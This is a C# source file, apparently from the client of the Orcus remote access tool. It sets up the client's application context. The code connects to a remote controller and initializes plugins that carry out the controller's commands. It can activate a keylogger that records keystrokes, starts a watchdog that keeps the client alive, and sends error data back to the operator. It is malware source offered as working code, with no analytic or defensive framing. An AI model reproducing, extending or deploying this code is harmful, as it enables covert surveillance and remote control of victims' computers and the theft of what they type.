using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Orcus.Config;
using Orcus.Connection;
using Orcus.Core;
using Orcus.Plugins;
using Orcus.Protection;
using Orcus.Shared.Commands.ExceptionHandling;
using Orcus.Shared.NetSerializer;
using Orcus.Shared.Settings;
using Orcus.StaticCommandManagement;
using Orcus.Utilities;
using Orcus.Utilities.KeyLogger;

namespace Orcus
{
    public class OrcusApplicationContext : ApplicationContext
    {
        private readonly Client _client;
        private readonly object _unloadLock = new object();
        private bool _unloaded;

        public OrcusApplicationContext()
        {
            Application.Idle += ApplicationOnIdle;
            _client = new Client();
            _client.Connected += ClientOnConnected;

            StaticCommandSelector.Initialize(_client);

            foreach (var factoryCommandPlugin in PluginLoader.Current.FactoryCommandPlugins)
                factoryCommandPlugin.Factory.Initialize(ClientOperator.Instance);

            _client.BeginConnect();
            Application.ApplicationExit += Application_ApplicationExit;
            ErrorReporter.Current.ExceptionsAvailable += Current_ExceptionsAvailable;

            if (Settings.GetBuilderProperty<KeyloggerBuilderProperty>().IsEnabled)
            {
                KeyLoggerService = new KeyLoggerService(ClientOperator.Instance.DatabaseConnection);
                try
                {
                    KeyLoggerService.Activate();
                }
                catch (Exception ex)
                {
                    ErrorReporter.Current.ReportError(ex, "Activating keylogger");
                }
            }

            foreach (var clientPlugin in PluginLoader.Current.Loadables)
            {
                try
                {
                    clientPlugin.Start();
                }
                catch (Exception ex)
                {
                    ErrorReporter.Current.ReportError(ex, "Load plugin: \"" + clientPlugin.GetType() + "\"");
                }
            }

            if (
                File.Exists(Path.GetTempPath() +
                            "\\e3c6cefd462d48f0b30a5ebcd238b5b1"))
                File.WriteAllText(
                    Path.GetTempPath() + "\\e3c6cefd462d48f0b30a5ebcd238b5b1",
                    SettingsData.SIGNATURE);

            AppDomain.CurrentDomain.AssemblyResolve += CurrentDomainOnAssemblyResolve;

            ShowWindow(); //THIS MUST BE THE LAST LINE!!!
        }

        private Assembly CurrentDomainOnAssemblyResolve(object sender, ResolveEventArgs args)
        {
            var libraryDirectory = new DirectoryInfo(Consts.LibrariesDirectory);
            if (!libraryDirectory.Exists)
                return null;

            var assemblyPath = Path.Combine(libraryDirectory.FullName, new AssemblyName(args.Name).Name + ".dll");
            return !File.Exists(assemblyPath) ? null : Assembly.LoadFrom(assemblyPath);
        }

        public KeyLoggerService KeyLoggerService { get; }
        public AsyncOperation AsyncOperation { get; private set; }

        private void ShowWindow()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            var icon = new NotifyIcon
            {
                Icon = Properties.Resources.ConnectEnvironment,
                Text = "Orcus Client",
                Visible = true
            };
            Form window = null;
            icon.DoubleClick += (sender, args) =>
            {
                if (window == null)
                {
                    window = new MainForm(_client);
                    window.Show();
                    window.Closing += (o, eventArgs) => window = null;
                }
                else
                {
                    window.Activate();
                }
            };
        }

        private void ClientOnConnected(object sender, EventArgs eventArgs)
        {
            if (ErrorReporter.Current.IsDataAvailable)
                Current_ExceptionsAvailable(null, null);
        }

        private void Current_ExceptionsAvailable(object sender, EventArgs e)
        {
            if (_client.IsConnected)
            {
                try
                {
                    var serializer = new Serializer(typeof (List<ExceptionInfo>));
                    _client.Connection.PushExceptions(serializer.Serialize(ErrorReporter.Current.GetData()));
                    ErrorReporter.Current.ExceptionSent();
                }
                catch (Exception)
                {
                    // ignored
                }
            }
        }

        public void Unload()
        {
            if (_unloaded)
                return;

            lock (_unloadLock)
            {
                if (_unloaded)
                    return;

                _unloaded = true;

                _client.Dispose();
                Program.Mutex.Close();

                foreach (var plugin in PluginLoader.Current.Loadables)
                    try
                    {
                        plugin.Shutdown();
                    }
                    catch (Exception ex)
                    {
                        ErrorReporter.Current.ReportError(ex, "Shutdown plugin\"" + plugin.GetType() + "\"");
                    }

                KeyLoggerService?.Dispose();
            }
        }

        private void Application_ApplicationExit(object sender, EventArgs e)
        {
            Unload();
        }

        private void ApplicationOnIdle(object sender, EventArgs eventArgs)
        {
            Application.Idle -= ApplicationOnIdle;
            AsyncOperation = AsyncOperationManager.CreateOperation(null);

            if (Settings.GetBuilderProperty<WatchdogBuilderProperty>().IsEnabled) //because it registers the SessionEnding-Event
                Watchdog.Initizalize();
        }
    }
}